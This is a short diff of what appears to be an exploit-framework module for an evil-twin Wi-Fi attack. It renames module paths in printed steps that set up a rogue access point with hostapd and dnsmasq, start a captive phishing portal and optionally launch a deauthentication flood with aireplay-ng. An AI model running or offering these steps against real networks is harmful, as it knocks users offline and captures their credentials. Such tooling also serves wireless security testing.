@@ -115,8 +115,8 @@ class Exploit(Exploit):
         print_status("1) Put {} in AP mode; assign IP 10.66.77.1/24 on AP iface.".format(self.ap_interface))
         print_status("2) hostapd {}".format(out / "hostapd_evil_twin.conf"))
         print_status("3) dnsmasq --conf-file={} --no-daemon".format(out / "dnsmasq_evil_twin.conf"))
-        print_status("4) Start captive portal: use generic/wifi_lab/captive_portal_modern_lab on :80")
-        print_status("5) Optional deauth: generic/wifi_lab/aireplay_deauth_barrage or mdk4_bridge")
+        print_status("4) Start captive portal: use generic/wifi/captive_portal_modern_lab on :80")
+        print_status("5) Optional deauth: generic/wifi/aireplay_deauth_barrage or flood_engine_native")
 
         if self.launch_deauth_orchestrator and self.mon_interface and self.target_bssid:
             arp = shutil.which("aireplay-ng")
